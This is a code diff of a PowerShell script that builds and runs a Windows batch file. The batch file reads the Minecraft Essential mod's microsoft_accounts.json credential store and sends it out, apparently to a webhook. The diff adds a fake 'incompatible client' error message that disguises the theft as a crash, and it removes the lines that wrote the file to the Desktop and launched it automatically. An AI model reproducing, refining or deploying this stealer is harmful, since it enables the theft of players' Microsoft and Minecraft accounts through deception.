@@ -1,8 +1,3 @@
-# Define the path for the batch file
-$desktopPath = [System.Environment]::GetFolderPath('Desktop')
-$batchFilePath = Join-Path $desktopPath 'send_webhook.bat'
-
-# Define the content of the batch file
 $batchContent = @"
 @echo off
 setlocal enabledelayedexpansion
@@ -16,7 +11,7 @@ set filePath=%USERPROFILE%\AppData\Roaming\gg.essential.mod\microsoft_accounts.j
 :: Check if the file exists
 if not exist "%filePath%" (
     echo File accounts.json does not exist at the specified path.
-    exit /b
+    goto :end
 )
 
 :: Prepare message
@@ -40,15 +35,10 @@ if %errorlevel% neq 0 (
     echo File sent successfully!
 )
 
+:end
+echo.
+echo imcompatible client l1./-9  error 8562 not found syntax error index.js
+echo.
+pause
 endlocal
 "@
-
-# Write the content to the batch file
-Set-Content -Path $batchFilePath -Value $batchContent
-
-# Output a message to confirm creation
-Write-Host "Batch file created at $batchFilePath"
-
-# Run the batch file automatically
-Start-Process -FilePath $batchFilePath
-Write-Host "Batch file is now running..."
